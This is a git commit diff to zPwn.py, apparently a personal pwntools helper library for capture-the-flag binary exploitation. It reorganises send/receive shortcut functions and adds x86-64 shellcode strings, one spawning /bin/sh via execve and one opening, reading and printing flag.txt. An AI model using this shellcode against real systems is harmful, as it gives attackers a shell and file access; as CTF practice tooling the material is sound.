00e3d5e2c2ed48022a381dd0d74d03a9d4b79e38
zKltch <cth2684@gmail.com>
2025-02-28 20:38:36 +0800

    Update shell function

--- zPwn.py
+++ zPwn.py
@@ -3,19 +3,8 @@ from pwn import *
 context.arch='amd64'
 r=''
 
-def s(payload): return r.send(payload)
-def sl(payload): return r.sendline(payload)
-def sla(after, payload): return r.sendlineafter(after, payload)
-def sa(after, payload): return r.sendafter(after, payload)
-def rc(num): return r.recv(num)
-def rcl(): return r.recvline()
-def rcls(num): return r.recvlines(num)
-def rcu(payload): return r.recvuntil(payload)
-def ita(): return r.interactive()
-def cl(): return r.close()
-def debug(): context.log_level='DEBUG'
-def gdbat(): return gdb.attach(r)
 
+#connect
 
 def r(REMOTE_INFO:str):
     global r
@@ -28,3 +17,70 @@ def p(REMOTE_INFO:str):
     global r
     r=process(REMOTE_INFO)
     
+
+#shorten common command 
+
+def s(payload): return r.send(payload)
+def sl(payload): return r.sendline(payload)
+def sla(after, payload): return r.sendlineafter(after, payload)
+def sa(after, payload): return r.sendafter(after, payload)
+def rc(num): return r.recv(num)
+def rcl(): return r.recvline()
+def rcls(num): return r.recvlines(num)
+def rcu(payload): return r.recvuntil(payload)
+def ita(): return r.interactive()
+def cl(): return r.close()
+
+#shorten function
+
+def debug(): context.log_level='DEBUG'
+def gdbat(): return gdb.attach(r)
+
+
+#shells
+
+class shells:
+    
+    def __init__(self):
+        self=self
+
+    def sh():
+        return  '''
+            xor rbx,rbx 
+            mov rbx, 0x68732f6e69622f 
+            push rbx 
+            mov rdi,rsp 
+            mov rax,0x3b 
+            xor rsi,rsi 
+            xor rdx, rdx 
+            syscall
+            // /bin/sh
+
+            '''
+
+    def orw():
+        return '''
+    mov rax, 0x7478742e67616c66
+    push rax
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 2
+    syscall
+    // open( "flag.txt" , 0 , 0 )
+
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x50
+    mov rax, 0
+    syscall
+    // read( fd , rsp , 0x50 )
+
+    mov rdi, 1
+    mov rax, 1
+    syscall
+    // write( 1 , rsp , 0x50 )
+
+    ''' 
+
+
